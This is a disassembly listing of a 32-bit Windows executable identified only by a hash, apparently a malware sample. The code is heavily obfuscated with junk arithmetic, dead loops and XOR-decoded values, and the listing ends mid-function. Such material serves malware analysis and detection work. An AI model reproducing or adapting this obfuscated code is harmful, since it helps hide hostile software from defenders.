
d6526243b342558767e0324b33dd2aa0ae95ca85ff2ccdbec2a0af2c84035f0e.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x108
  401009:	add    DWORD PTR ds:0x42f000,0x432000
  401013:	push   esi
  401014:	sub    DWORD PTR ds:0x43101c,0x42f018
  40101e:	push   edi
  40101f:	xor    DWORD PTR ds:0x42e020,0x431010
  401029:	lea    eax,[ebp-0xc4]
  40102f:	inc    DWORD PTR ds:0x42f010
  401035:	push   eax
  401036:	push   0xf
  401038:	mov    DWORD PTR ds:0x42e000,0x5c4e
  401042:	call   DWORD PTR ds:0x43491b
  401048:	adc    DWORD PTR ds:0x431014,ebx
  40104e:	mov    esi,DWORD PTR ds:0x4348f7
  401054:	and    DWORD PTR ds:0x431008,0x42f010
  40105e:	push   0x4343e7
  401063:	xor    DWORD PTR ds:0x432000,0x42f010
  40106d:	xor    edi,edi
  40106f:	adc    DWORD PTR ds:0x42f01c,0x43201c
  401079:	inc    edi
  40107a:	and    DWORD PTR ds:0x42f00c,0x62f7
  401084:	push   edi
  401085:	adc    DWORD PTR ds:0x432008,0x432000
  40108f:	push   edi
  401090:	xor    DWORD PTR ds:0x430004,0x55
  40109a:	call   esi
  40109c:	xor    DWORD PTR ds:0x42e000,0x137b
  4010a6:	test   eax,eax
  4010a8:	mov    DWORD PTR ds:0x430004,0x482
  4010b2:	je     0x40119d
  4010b8:	push   0x4343ff
  4010bd:	push   edi
  4010be:	push   edi
  4010bf:	and    DWORD PTR ds:0x432008,0x42e018
  4010c9:	call   esi
  4010cb:	test   eax,eax
  4010cd:	mov    DWORD PTR ds:0x432008,0x1562
  4010d7:	je     0x4010ee
  4010dd:	adc    DWORD PTR ds:0x42f008,0x6c9b
  4010e7:	xor    eax,eax
  4010e9:	jmp    0x4026c9
  4010ee:	or     DWORD PTR ds:0x42e018,0x42e01c
  4010f8:	push   0x9
  4010fa:	and    DWORD PTR ds:0x430004,0x42e004
  401104:	push   0x434417
  401109:	add    DWORD PTR ds:0x42f004,0x43000c
  401113:	call   DWORD PTR ds:0x4348ef
  401119:	test   eax,eax
  40111b:	mov    DWORD PTR ds:0x42e008,0xb3c
  401125:	je     0x40113a
  40112b:	lea    eax,[ebp-0x20]
  40112e:	push   eax
  40112f:	call   DWORD PTR ds:0x4348af
  401135:	jmp    0x4026c9
  40113a:	add    DWORD PTR ds:0x432000,0x7af2
  401144:	push   0x43443b
  401149:	push   edi
  40114a:	add    DWORD PTR ds:0x43100c,0x430018
  401154:	push   edi
  401155:	and    DWORD PTR ds:0x430010,0x466f
  40115f:	call   DWORD PTR ds:0x43490b
  401165:	add    DWORD PTR ds:0x430010,0x431018
  40116f:	test   eax,eax
  401171:	mov    DWORD PTR ds:0x43201c,0x38e4
  40117b:	jne    0x40112b
  401181:	push   0xd
  401183:	add    DWORD PTR ds:0x42e004,0x6394
  40118d:	push   0x43444b
  401192:	call   DWORD PTR ds:0x43490f
  401198:	jmp    0x4010dd
  40119d:	push   0x9
  40119f:	push   0x43445b
  4011a4:	add    DWORD PTR ds:0x43000c,0x42e000
  4011ae:	call   DWORD PTR ds:0x4348ef
  4011b4:	and    DWORD PTR ds:0x432008,0x42e018
  4011be:	test   eax,eax
  4011c0:	jne    0x401240
  4011c6:	and    DWORD PTR ds:0x430004,0x432010
  4011d0:	push   0x434477
  4011d5:	push   edi
  4011d6:	sub    DWORD PTR ds:0x430010,0x432014
  4011e0:	push   edi
  4011e1:	sbb    DWORD PTR ds:0x42e00c,0x1a43
  4011eb:	call   DWORD PTR ds:0x43490b
  4011f1:	add    DWORD PTR ds:0x42f00c,0x430004
  4011fb:	test   eax,eax
  4011fd:	mov    DWORD PTR ds:0x430004,0x2e6d
  401207:	jne    0x40112b
  40120d:	and    DWORD PTR ds:0x42e008,0x43101c
  401217:	push   0xd
  401219:	push   0x434487
  40121e:	call   DWORD PTR ds:0x43490f
  401224:	adc    DWORD PTR ds:0x42f018,0x799a
  40122e:	test   eax,eax
  401230:	mov    DWORD PTR ds:0x42f004,0x637d
  40123a:	jne    0x40112b
  401240:	mov    edi,DWORD PTR ds:0x41d082
  401246:	mov    edi,DWORD PTR [edi]
  401248:	and    DWORD PTR ds:0x431008,edi
  40124e:	mov    DWORD PTR [ebp-0x10],0x0
  401255:	and    DWORD PTR ds:0x431004,ebx
  40125b:	mov    eax,DWORD PTR [ebp-0x3c]
  40125e:	mov    DWORD PTR ds:0x42e01c,0x1f
  401268:	cmp    DWORD PTR ds:0x42e01c,0x0
  40126f:	je     0x4012d6
  401275:	cmp    DWORD PTR ds:0x42e01c,0xe
  40127c:	jg     0x4012d6
  401282:	jmp    0x4012aa
  401287:	push   0x431000
  40128c:	push   0x87aa
  401291:	push   0x3cef
  401296:	push   0x5469
  40129b:	push   DWORD PTR [ebp-0x24]
  40129e:	push   DWORD PTR [ebp-0x10]
  4012a1:	push   DWORD PTR [ebp-0x28]
  4012a4:	call   DWORD PTR ds:0x4348e7
  4012aa:	cmp    DWORD PTR ds:0x42e01c,0xf
  4012b1:	jne    0x4012c4
  4012b7:	mov    ecx,DWORD PTR ds:0x42e01c
  4012bd:	dec    ecx
  4012be:	mov    DWORD PTR ds:0x42e01c,ecx
  4012c4:	mov    ecx,DWORD PTR ds:0x42e01c
  4012ca:	dec    ecx
  4012cb:	mov    DWORD PTR ds:0x42e01c,ecx
  4012d1:	jmp    0x401268
  4012d6:	mov    DWORD PTR [ebp-0x3c],eax
  4012d9:	mov    ecx,DWORD PTR ds:0x430010
  4012df:	or     DWORD PTR ds:0x431010,ecx
  4012e5:	mov    DWORD PTR [ebp-0x8],0xf89c8581
  4012ec:	sub    ecx,esi
  4012ee:	mov    DWORD PTR [ebp-0xc],0xf89c8580
  4012f5:	xor    edi,edi
  4012f7:	add    edi,DWORD PTR ds:0x42e008
  4012fd:	xor    DWORD PTR ds:0x42f014,edi
  401303:	lea    eax,[ebp-0x44]
  401306:	mov    DWORD PTR [ebp-0x38],eax
  401309:	movzx  esi,BYTE PTR ds:0x42f01c
  401310:	or     esi,DWORD PTR ds:0x431004
  401316:	mov    DWORD PTR ds:0x42f01c,esi
  40131c:	lea    eax,[ebp-0x48]
  40131f:	mov    DWORD PTR [ebp-0x18],eax
  401322:	mov    eax,ds:0x4342d7
  401327:	add    DWORD PTR ds:0x432008,0x58e0
  401331:	mov    eax,DWORD PTR [eax+0x1c8]
  401337:	xor    DWORD PTR ds:0x42e008,edi
  40133d:	mov    eax,DWORD PTR [eax]
  40133f:	add    edi,esi
  401341:	mov    ecx,DWORD PTR [ebp-0x18]
  401344:	or     esi,esi
  401346:	mov    esi,0x751089d
  40134b:	movzx  edi,BYTE PTR ds:0x430008
  401352:	sub    DWORD PTR ds:0x42e024,edi
  401358:	xor    eax,esi
  40135a:	mov    DWORD PTR ds:0x431008,0x1e
  401364:	cmp    DWORD PTR ds:0x431008,0x0
  40136b:	je     0x4013d1
  401371:	cmp    DWORD PTR ds:0x431008,0xc
  401378:	jg     0x4013d1
  40137e:	jmp    0x4013a5
  401383:	push   0x8e8e
  401388:	push   0x0
  40138a:	push   DWORD PTR [ebp-0x10]
  40138d:	push   0x42f008
  401392:	push   DWORD PTR [ebp-0x28]
  401395:	push   0x1613
  40139a:	push   0x69aa
  40139f:	call   DWORD PTR ds:0x4348eb
  4013a5:	cmp    DWORD PTR ds:0x431008,0xd
  4013ac:	jne    0x4013bf
  4013b2:	mov    edi,DWORD PTR ds:0x431008
  4013b8:	dec    edi
  4013b9:	mov    DWORD PTR ds:0x431008,edi
  4013bf:	mov    edi,DWORD PTR ds:0x431008
  4013c5:	dec    edi
  4013c6:	mov    DWORD PTR ds:0x431008,edi
  4013cc:	jmp    0x401364
  4013d1:	mov    edi,0x3272e4
  4013d6:	sub    DWORD PTR ds:0x42e018,0x1414
  4013e0:	add    eax,edi
  4013e2:	mov    DWORD PTR ds:0x42f018,0x348
  4013ec:	mov    DWORD PTR [ecx],eax
  4013ee:	mov    eax,ds:0x43472b
  4013f3:	mov    DWORD PTR ds:0x42f01c,0x2d77
  4013fd:	cmp    eax,0x312bc9f6
  401402:	mov    DWORD PTR ds:0x430008,0x53dc
  40140c:	jne    0x40147c
  401412:	mov    eax,DWORD PTR [ebp-0x8]
  401415:	mov    ecx,DWORD PTR ds:0x4342d7
  40141b:	mov    ecx,DWORD PTR [ecx+0x198]
  401421:	add    DWORD PTR ds:0x43101c,0x42e010
  40142b:	xor    eax,esi
  40142d:	or     DWORD PTR ds:0x430000,0x43201c
  401437:	add    eax,edi
  401439:	and    DWORD PTR ds:0x43100c,0x5e05
  401443:	mov    DWORD PTR [ecx],eax
  401445:	movzx  eax,WORD PTR ds:0x43200c
  40144c:	or     DWORD PTR ds:0x42e004,eax
  401452:	mov    eax,DWORD PTR [ebp-0x8]
  401455:	adc    DWORD PTR ds:0x42e004,0x70db
  40145f:	xor    eax,esi
  401461:	or     DWORD PTR ds:0x432010,0x4354
  40146b:	add    eax,edi
  40146d:	mov    DWORD PTR ds:0x431008,0x6492
  401477:	mov    ds:0x43472b,eax
  40147c:	mov    eax,ds:0x4342d7
  401481:	mov    eax,DWORD PTR [eax+0x18c]
  401487:	sub    DWORD PTR ds:0x431000,0x42e024
  401491:	mov    eax,DWORD PTR [eax]
  401493:	or     DWORD PTR ds:0x42e01c,0x36
  40149d:	mov    DWORD PTR [ebp-0x7c],eax
  4014a0:	neg    DWORD PTR ds:0x42e01c
  4014a6:	mov    eax,0xf89c85bd
  4014ab:	mov    DWORD PTR [ebp-0x10],eax
  4014ae:	adc    DWORD PTR ds:0x431004,0x7bd1
  4014b8:	mov    DWORD PTR [ebp-0x10],eax
  4014bb:	or     DWORD PTR ds:0x42e028,0x5a2b
  4014c5:	mov    DWORD PTR [ebp-0x10],eax
  4014c8:	mov    DWORD PTR [ebp-0x18],0xf89c8581
  4014cf:	push   ebx
  4014d0:	mov    DWORD PTR [ebp-0x10],eax
  4014d3:	mov    ebx,DWORD PTR ds:0x42e024
  4014d9:	xor    DWORD PTR ds:0x42e018,ebx
  4014df:	mov    DWORD PTR [ebp-0x10],0xf89c85b9
  4014e6:	xor    DWORD PTR ds:0x430010,0x43100c
  4014f0:	mov    ebx,DWORD PTR [ebp-0x8]
  4014f3:	xor    ebx,esi
  4014f5:	add    ebx,edi
  4014f7:	mov    DWORD PTR ds:0x43100c,0xa17
  401501:	jmp    0x401639
  401506:	not    DWORD PTR ds:0x42e028
  40150c:	mov    eax,DWORD PTR [ebp-0xc]
  40150f:	xor    eax,esi
  401511:	lea    eax,[eax+ebx*1+0x3272e4]
  401518:	adc    DWORD PTR ds:0x43201c,0x42e00c
  401522:	push   eax
  401523:	xor    DWORD PTR ds:0x43200c,0x6ae7
  40152d:	mov    eax,DWORD PTR [ebp-0x18]
  401530:	xor    eax,esi
  401532:	or     DWORD PTR ds:0x42f010,0x432010
  40153c:	lea    eax,[ebp+eax*1+0x3272ec]
  401543:	sbb    DWORD PTR ds:0x42f018,0x7b10
  40154d:	push   eax
  40154e:	mov    DWORD PTR ds:0x431000,0x1b
  401558:	cmp    DWORD PTR ds:0x431000,0x0
  40155f:	je     0x40159f
  401565:	cmp    DWORD PTR ds:0x431000,0x1e
  40156c:	jl     0x40159f
  401572:	jmp    0x40158f
  401577:	push   0x8bad
  40157c:	push   0x43001c
  401581:	push   DWORD PTR [ebp-0x18]
  401584:	push   0x177c
  401589:	call   DWORD PTR ds:0x4348f3
  40158f:	mov    eax,ds:0x431000
  401594:	dec    eax
  401595:	mov    ds:0x431000,eax
  40159a:	jmp    0x401558
  40159f:	mov    eax,ds:0x4342d7
  4015a4:	sbb    DWORD PTR ds:0x42e010,0x430000
  4015ae:	push   DWORD PTR [eax+0x1bc]
  4015b4:	neg    DWORD PTR ds:0x42f008
  4015ba:	call   0x4026dd
  4015bf:	and    DWORD PTR ds:0x42e00c,0x0
  4015c9:	mov    eax,ds:0x42e00c
  4015ce:	inc    eax
  4015cf:	mov    ds:0x42e00c,eax
  4015d4:	cmp    DWORD PTR ds:0x42e00c,0x7
  4015db:	jbe    0x401623
  4015e1:	jmp    0x4015fb
  4015e6:	push   0x3590
  4015eb:	push   0x431004
  4015f0:	push   0x4340ed
  4015f5:	call   DWORD PTR ds:0x4348fb
  4015fb:	cmp    DWORD PTR ds:0x42e00c,0x6
  401602:	jne    0x401616
  401608:	xor    eax,eax
  40160a:	or     eax,DWORD PTR ds:0x42e00c
  401610:	inc    eax
  401611:	mov    ds:0x42e00c,eax
  401616:	cmp    DWORD PTR ds:0x42e00c,0x11
  40161d:	jb     0x4015c9
  401623:	mov    eax,DWORD PTR [ebp-0xc]
  401626:	xor    DWORD PTR ds:0x42e014,0xbbe
  401630:	xor    eax,esi
  401632:	lea    ebx,[ebx+eax*1+0x3272e4]
  401639:	and    DWORD PTR ds:0x431018,0x0
  401643:	jmp    0x401653
  401648:	mov    eax,ds:0x431018
  40164d:	inc    eax
  40164e:	mov    ds:0x431018,eax
  401653:	cmp    DWORD PTR ds:0x431018,0x10
  40165a:	jae    0x401697
  401660:	cmp    DWORD PTR ds:0x431018,0x1c
  401667:	ja     0x401697
  40166d:	jmp    0x401692
  401672:	push   0x490f
  401677:	push   0x4340d1
  40167c:	push   0x783a
  401681:	push   0x4340d1
  401686:	push   DWORD PTR [ebp-0x24]
  401689:	push   DWORD PTR [ebp-0x10]
  40168c:	call   DWORD PTR ds:0x4348ff
  401692:	jmp    0x401648
  401697:	mov    eax,DWORD PTR [ebp-0xc]
  40169a:	and    DWORD PTR ds:0x42e018,0x0
  4016a4:	jmp    0x4016b6
  4016a9:	mov    ecx,DWORD PTR ds:0x42e018
  4016af:	inc    ecx
  4016b0:	mov    DWORD PTR ds:0x42e018,ecx
  4016b6:	cmp    DWORD PTR ds:0x42e018,0x18
  4016bd:	jae    0x4016fd
  4016c3:	cmp    DWORD PTR ds:0x42e018,0xd
  4016ca:	jb     0x4016fd
  4016d0:	jmp    0x4016de
  4016d5:	push   DWORD PTR [ebp-0x10]
  4016d8:	call   DWORD PTR ds:0x434903
  4016de:	cmp    DWORD PTR ds:0x42e018,0xc
  4016e5:	jne    0x4016f8
  4016eb:	mov    ecx,DWORD PTR ds:0x42e018
  4016f1:	inc    ecx
  4016f2:	mov    DWORD PTR ds:0x42e018,ecx
  4016f8:	jmp    0x4016a9
  4016fd:	mov    ecx,DWORD PTR [ebp-0xc]
  401700:	sub    DWORD PTR ds:0x431010,0x5342
  40170a:	xor    ecx,esi
  40170c:	and    DWORD PTR ds:0x42e028,0x43001c
  401716:	xor    eax,esi
  401718:	sbb    DWORD PTR ds:0x42f01c,0x42f014
  401722:	add    eax,ecx
  401724:	and    DWORD PTR ds:0x430014,0x0
  40172e:	jmp    0x401740
  401733:	mov    ecx,DWORD PTR ds:0x430014
  401739:	inc    ecx
  40173a:	mov    DWORD PTR ds:0x430014,ecx
  401740:	cmp    DWORD PTR ds:0x430014,0x11
  401747:	jae    0x40178f
  40174d:	cmp    DWORD PTR ds:0x430014,0x9
  401754:	jb     0x40178f
  40175a:	jmp    0x401770
  40175f:	push   DWORD PTR [ebp-0x20]
  401762:	push   0x431010
  401767:	push   DWORD PTR [ebp-0x24]
  40176a:	call   DWORD PTR ds:0x434907
  401770:	cmp    DWORD PTR ds:0x430014,0x8
  401777:	jne    0x40178a
  40177d:	mov    ecx,DWORD PTR ds:0x430014
  401783:	inc    ecx
  401784:	mov    DWORD PTR ds:0x430014,ecx
  40178a:	jmp    0x401733
  40178f:	mov    ecx,DWORD PTR [ebp-0xc]
  401792:	add    DWORD PTR ds:0x43000c,0x42f000
  40179c:	xor    ecx,esi
  40179e:	mov    DWORD PTR ds:0x432018,0x6f3a
  4017a8:	lea    eax,[eax+ecx*1+0x9758ac]
  4017af:	mov    DWORD PTR ds:0x42e020,0x2e88
  4017b9:	cmp    ebx,eax
  4017bb:	jbe    0x401506
  4017c1:	mov    eax,DWORD PTR [ebp+0xc]
  4017c4:	sbb    DWORD PTR ds:0x43000c,0x7d71
  4017ce:	mov    ds:0x43415b,eax
  4017d3:	mov    eax,DWORD PTR [ebp+0x10]
  4017d6:	mov    DWORD PTR ds:0x42e000,0x12
  4017e0:	cmp    DWORD PTR ds:0x42e000,0x0
  4017e7:	je     0x401833
  4017ed:	cmp    DWORD PTR ds:0x42e000,0x9
  4017f4:	ja     0x401833
  4017fa:	jmp    0x401805
  4017ff:	call   DWORD PTR ds:0x434913
  401805:	cmp    DWORD PTR ds:0x42e000,0xa
  40180c:	jne    0x40181f
  401812:	mov    ecx,DWORD PTR ds:0x42e000
  401818:	dec    ecx
  401819:	mov    DWORD PTR ds:0x42e000,ecx
  40181f:	xor    ecx,ecx
  401821:	xor    ecx,DWORD PTR ds:0x42e000
  401827:	dec    ecx
  401828:	mov    DWORD PTR ds:0x42e000,ecx
  40182e:	jmp    0x4017e0
  401833:	mov    ds:0x4343af,eax
  401838:	mov    ecx,DWORD PTR ds:0x41d0b2
  40183e:	mov    eax,ds:0x41d08e
  401843:	sub    eax,ecx
  401845:	or     ecx,DWORD PTR [ecx+eax*1]
  401848:	mov    eax,ds:0x43415b
  40184d:	mov    ecx,DWORD PTR [ebp-0x38]
  401850:	mov    DWORD PTR ds:0x43100c,0x6301
  40185a:	sub    eax,edi
  40185c:	and    DWORD PTR ds:0x431014,0x432000
  401866:	xor    eax,esi
  401868:	mov    DWORD PTR [ecx],eax
  40186a:	mov    eax,0x929
  40186f:	mov    eax,DWORD PTR [ebp-0x3c]
  401872:	cmp    eax,0xf89c8581
  401877:	mov    DWORD PTR ds:0x42f004,0x644a
  401881:	jne    0x401ddb
  401887:	push   0x43449b
  40188c:	xor    DWORD PTR ds:0x42f01c,0x1b49
  401896:	xor    ebx,ebx
  401898:	inc    ebx
  401899:	and    DWORD PTR ds:0x432000,0x430014
  4018a3:	push   ebx
  4018a4:	sub    DWORD PTR ds:0x430004,0x431008
  4018ae:	push   ebx
  4018af:	call   DWORD PTR ds:0x4348f7
  4018b5:	test   eax,eax
  4018b7:	mov    DWORD PTR ds:0x430018,0x4952
  4018c1:	jne    0x40257b
  4018c7:	sbb    DWORD PTR ds:0x430014,0x430018
  4018d1:	push   0x9
  4018d3:	sub    DWORD PTR ds:0x42f00c,0x6999
  4018dd:	push   0x4344b3
  4018e2:	call   DWORD PTR ds:0x4348ef
  4018e8:	or     DWORD PTR ds:0x43100c,0x43001c
  4018f2:	test   eax,eax
  4018f4:	mov    DWORD PTR ds:0x432014,0x2573
  4018fe:	jne    0x402557
  401904:	add    DWORD PTR ds:0x42e01c,0x43001c
  40190e:	push   0x4344cf
  401913:	adc    DWORD PTR ds:0x42f004,0x42f010
  40191d:	push   ebx
  40191e:	adc    DWORD PTR ds:0x42e010,0xbc4
  401928:	push   ebx
  401929:	call   DWORD PTR ds:0x43490b
  40192f:	sbb    DWORD PTR ds:0x431004,0x430018
  401939:	test   eax,eax
  40193b:	jne    0x402557
  401941:	sbb    DWORD PTR ds:0x431008,0x42e018
  40194b:	push   0xd
  40194d:	push   0x4344df
  401952:	and    DWORD PTR ds:0x432004,0x5cbf
  40195c:	call   DWORD PTR ds:0x43490f
  401962:	xor    DWORD PTR ds:0x431004,0x11cd
  40196c:	test   eax,eax
  40196e:	jne    0x40257b
  401974:	and    DWORD PTR ds:0x42e01c,0x1a36
  40197e:	lea    eax,[ebp-0x34]
  401981:	sbb    DWORD PTR ds:0x43001c,0x43101c
  40198b:	mov    DWORD PTR [ebp-0x9c],eax
  401991:	lea    eax,[ebp+0x4]
  401994:	mov    DWORD PTR [ebp-0x34],eax
  401997:	mov    DWORD PTR ds:0x42f00c,0x1c
  4019a1:	cmp    DWORD PTR ds:0x42f00c,0x0
  4019a8:	je     0x4019dc
  4019ae:	cmp    DWORD PTR ds:0x42f00c,0x23
  4019b5:	jl     0x4019dc
  4019bb:	jmp    0x4019c9
  4019c0:	push   DWORD PTR [ebp-0x20]
  4019c3:	call   DWORD PTR ds:0x434917
  4019c9:	xor    eax,eax
  4019cb:	add    eax,DWORD PTR ds:0x42f00c
  4019d1:	dec    eax
  4019d2:	mov    ds:0x42f00c,eax
  4019d7:	jmp    0x4019a1
  4019dc:	mov    eax,DWORD PTR [ebp-0x34]
  4019df:	test   eax,eax
  4019e1:	je     0x4026ad
  4019e7:	xor    ecx,0x7030
  4019ed:	mov    eax,DWORD PTR [ebp-0x28]
  4019f0:	mov    ecx,DWORD PTR ds:0x43201c
  4019f6:	add    DWORD PTR ds:0x431014,ecx
  4019fc:	mov    eax,DWORD PTR [ebp-0xc]
  4019ff:	mov    eax,DWORD PTR [ebp-0x8]
  401a02:	add    ecx,0x1ea6
  401a08:	mov    DWORD PTR [ebp+0xc],eax
  401a0b:	inc    DWORD PTR ds:0x431014
  401a11:	mov    eax,eax
  401a13:	sbb    ecx,DWORD PTR ds:0x431010
  401a19:	mov    eax,ds:0x4342d7
  401a1e:	inc    ecx
  401a1f:	mov    eax,DWORD PTR [eax+0x1c8]
  401a25:	movzx  ecx,WORD PTR ds:0x432018
  401a2c:	adc    ecx,DWORD PTR ds:0x42e00c
  401a32:	mov    DWORD PTR ds:0x432018,ecx
  401a38:	mov    eax,DWORD PTR [eax]
  401a3a:	mov    DWORD PTR ds:0x42e028,0x4824
  401a44:	cdq    
  401a45:	mov    ebx,eax
  401a47:	and    DWORD PTR ds:0x42e000,0x7e6d
  401a51:	mov    eax,0xfabdbee5
  401a56:	and    DWORD PTR ds:0x42e000,0x0
  401a60:	jmp    0x401a74
  401a65:	xor    ecx,ecx
  401a67:	or     ecx,DWORD PTR ds:0x42e000
  401a6d:	inc    ecx
  401a6e:	mov    DWORD PTR ds:0x42e000,ecx
  401a74:	cmp    DWORD PTR ds:0x42e000,0x19
  401a7b:	jae    0x401ac2
  401a81:	cmp    DWORD PTR ds:0x42e000,0x4
  401a88:	jg     0x401ac2
  401a8e:	jmp    0x401aa3
  401a93:	push   0x43406f
  401a98:	push   0x400000
  401a9d:	call   DWORD PTR ds:0x43491f
  401aa3:	cmp    DWORD PTR ds:0x42e000,0x3
  401aaa:	jne    0x401abd
  401ab0:	mov    ecx,DWORD PTR ds:0x42e000
  401ab6:	inc    ecx
  401ab7:	mov    DWORD PTR ds:0x42e000,ecx
  401abd:	jmp    0x401a65
  401ac2:	add    ebx,eax
  401ac4:	inc    ecx
  401ac5:	adc    edx,0xffffffff
  401ac8:	and    DWORD PTR ds:0x431018,0x0
  401ad2:	mov    ecx,DWORD PTR ds:0x431018
  401ad8:	inc    ecx
  401ad9:	mov    DWORD PTR ds:0x431018,ecx
  401adf:	cmp    DWORD PTR ds:0x431018,0xb
  401ae6:	jbe    0x401b26
  401aec:	jmp    0x401aff
  401af1:	push   DWORD PTR [ebp-0x10]
  401af4:	push   0x8792
  401af9:	call   DWORD PTR ds:0x434923
  401aff:	cmp    DWORD PTR ds:0x431018,0xa
  401b06:	jne    0x401b19
  401b0c:	mov    ecx,DWORD PTR ds:0x431018
  401b12:	inc    ecx
  401b13:	mov    DWORD PTR ds:0x431018,ecx
  401b19:	cmp    DWORD PTR ds:0x431018,0x16
  401b20:	jb     0x401ad2
  401b26:	and    DWORD PTR [ebp-0x10],0x0
  401b2a:	and    DWORD PTR ds:0x42f01c,0x0
  401b34:	jmp    0x401b46
  401b39:	mov    ecx,DWORD PTR ds:0x42f01c
  401b3f:	inc    ecx
  401b40:	mov    DWORD PTR ds:0x42f01c,ecx
  401b46:	cmp    DWORD PTR ds:0x42f01c,0x13
  401b4d:	jae    0x401b8f
  401b53:	cmp    DWORD PTR ds:0x42f01c,0x5
  401b5a:	jl     0x401b8f
  401b60:	jmp    0x401b70
  401b65:	push   0x434057
  401b6a:	call   DWORD PTR ds:0x434927
  401b70:	cmp    DWORD PTR ds:0x42f01c,0x4
  401b77:	jne    0x401b8a
  401b7d:	mov    ecx,DWORD PTR ds:0x42f01c
  401b83:	inc    ecx
  401b84:	mov    DWORD PTR ds:0x42f01c,ecx
  401b8a:	jmp    0x401b39
  401b8f:	xor    edx,0x0
  401b92:	or     ecx,DWORD PTR ds:0x430010
  401b98:	mov    DWORD PTR [ebp-0x6c],edx
  401b9b:	mov    edx,DWORD PTR [ebp+0xc]
  401b9e:	mov    DWORD PTR [ebp-0x14],edx
  401ba1:	mov    DWORD PTR ds:0x42f010,0x1d
  401bab:	cmp    DWORD PTR ds:0x42f010,0x0
  401bb2:	je     0x401c17
  401bb8:	cmp    DWORD PTR ds:0x42f010,0x7
  401bbf:	jl     0x401c17
  401bc5:	jmp    0x401beb
  401bca:	push   0x42e020
  401bcf:	push   DWORD PTR [ebp-0x18]
  401bd2:	push   0x8651
  401bd7:	push   0x3db4
  401bdc:	push   DWORD PTR [ebp-0x1c]
  401bdf:	push   DWORD PTR [ebp-0x20]
  401be2:	push   DWORD PTR [ebp-0x1c]
  401be5:	call   DWORD PTR ds:0x4348e7
  401beb:	cmp    DWORD PTR ds:0x42f010,0x8
  401bf2:	jne    0x401c05
  401bf8:	mov    ecx,DWORD PTR ds:0x42f010
  401bfe:	dec    ecx
  401bff:	mov    DWORD PTR ds:0x42f010,ecx
  401c05:	mov    ecx,DWORD PTR ds:0x42f010
  401c0b:	dec    ecx
  401c0c:	mov    DWORD PTR ds:0x42f010,ecx
  401c12:	jmp    0x401bab
  401c17:	mov    ecx,0x8a29a12f
  401c1c:	xor    ebx,ecx
  401c1e:	add    DWORD PTR [ebp-0x14],eax
  401c21:	mov    DWORD PTR ds:0x42e018,0xcc4
  401c2b:	mov    edx,DWORD PTR [ebp-0x14]
  401c2e:	adc    DWORD PTR [ebp-0x10],0xffffffff
  401c32:	sub    DWORD PTR ds:0x431010,0x4c88
  401c3c:	xor    edx,ecx
  401c3e:	adc    DWORD PTR ds:0x430004,0x42e018
  401c48:	mov    DWORD PTR [ebp-0x5c],edx
  401c4b:	or     edx,DWORD PTR ds:0x432008
  401c51:	mov    edx,DWORD PTR [ebp-0x10]
  401c54:	sbb    DWORD PTR ds:0x430008,0x42f00c
  401c5e:	xor    edx,0x0
  401c61:	mov    DWORD PTR ds:0x42f00c,0x39c
  401c6b:	mov    DWORD PTR [ebp-0x58],edx
  401c6e:	cmp    DWORD PTR [ebp-0x5c],ebx
  401c71:	jne    0x401c83
  401c77:	mov    edx,DWORD PTR [ebp-0x6c]
  401c7a:	cmp    DWORD PTR [ebp-0x58],edx
  401c7d:	je     0x401ce0
  401c83:	adc    DWORD PTR ds:0x431014,ebx
  401c89:	mov    edx,DWORD PTR ds:0x4342d7
  401c8f:	or     DWORD PTR ds:0x42e024,0x432008
  401c99:	mov    edx,DWORD PTR [edx+0x1c0]
  401c9f:	add    DWORD PTR ds:0x42e018,0x430004
  401ca9:	mov    edx,DWORD PTR [edx]
  401cab:	xor    ebx,ebx
  401cad:	add    edx,eax
  401caf:	adc    ebx,0xffffffff
  401cb2:	xor    edx,ecx
  401cb4:	xor    ebx,0x0
  401cb7:	cmp    edx,0x70941fc9
  401cbd:	mov    DWORD PTR ds:0x432014,0x6222
  401cc7:	jne    0x4026ad
  401ccd:	cmp    ebx,0xffffffff
  401cd0:	mov    DWORD PTR ds:0x430010,0x168c
  401cda:	jne    0x4026ad
  401ce0:	mov    edx,DWORD PTR ds:0x434353
  401ce6:	or     DWORD PTR ds:0x42f01c,0x338f
  401cf0:	mov    ebx,DWORD PTR ds:0x43435b
  401cf6:	sbb    DWORD PTR ds:0x42f01c,0x42e008
  401d00:	xor    edx,ebx
  401d02:	and    DWORD PTR ds:0x432000,0x0
  401d0c:	jmp    0x401d1e
  401d11:	mov    ebx,DWORD PTR ds:0x432000
  401d17:	inc    ebx
  401d18:	mov    DWORD PTR ds:0x432000,ebx
  401d1e:	cmp    DWORD PTR ds:0x432000,0x1a
  401d25:	jae    0x401d62
  401d2b:	cmp    DWORD PTR ds:0x432000,0x29
  401d32:	jle    0x401d62
  401d38:	jmp    0x401d5d
  401d3d:	push   DWORD PTR [ebp-0xc]
  401d40:	push   0x0
  401d42:	push   0x8e65
  401d47:	push   0x432008
  401d4c:	push   0x77f3
  401d51:	push   DWORD PTR [ebp-0x24]
  401d54:	push   DWORD PTR [ebp-0x20]
  401d57:	call   DWORD PTR ds:0x4348eb
  401d5d:	jmp    0x401d11
  401d62:	mov    DWORD PTR ds:0x434353,edx
  401d68:	and    DWORD PTR ds:0x430000,0x0
  401d72:	mov    ebx,DWORD PTR ds:0x430000
  401d78:	inc    ebx
  401d79:	mov    DWORD PTR ds:0x430000,ebx
  401d7f:	cmp    DWORD PTR ds:0x430000,0x21
  401d86:	jge    0x401db8
  401d8c:	jmp    0x401dab
  401d91:	push   0x349e
  401d96:	push   0x42e01c
  401d9b:	push   0x2daf
  401da0:	push   0x5f77
  401da5:	call   DWORD PTR ds:0x4348f3
  401dab:	cmp    DWORD PTR ds:0x430000,0x14
  401db2:	jb     0x401d72
  401db8:	mov    edx,DWORD PTR [ebp-0x34]
  401dbb:	mov    ebx,DWORD PTR ds:0x434353
  401dc1:	add    ebx,DWORD PTR [edx]
  401dc3:	mov    DWORD PTR ds:0x42f004,edx
  401dc9:	mov    edx,DWORD PTR [ebp-0x34]
  401dcc:	mov    DWORD PTR ds:0x432010,0x3a94
  401dd6:	jmp    0x40266c
  401ddb:	mov    DWORD PTR ds:0x43101c,0x62ff
  401de5:	mov    eax,DWORD PTR [ebp-0x44]
  401de8:	mov    DWORD PTR ds:0x432000,0x1e78
  401df2:	cmp    eax,0xf89c8580
  401df7:	je     0x40206b
  401dfd:	xor    eax,eax
  401dff:	xor    eax,DWORD PTR ds:0x41d062
  401e05:	mov    ecx,DWORD PTR ds:0x433004
  401e0b:	sub    ecx,eax
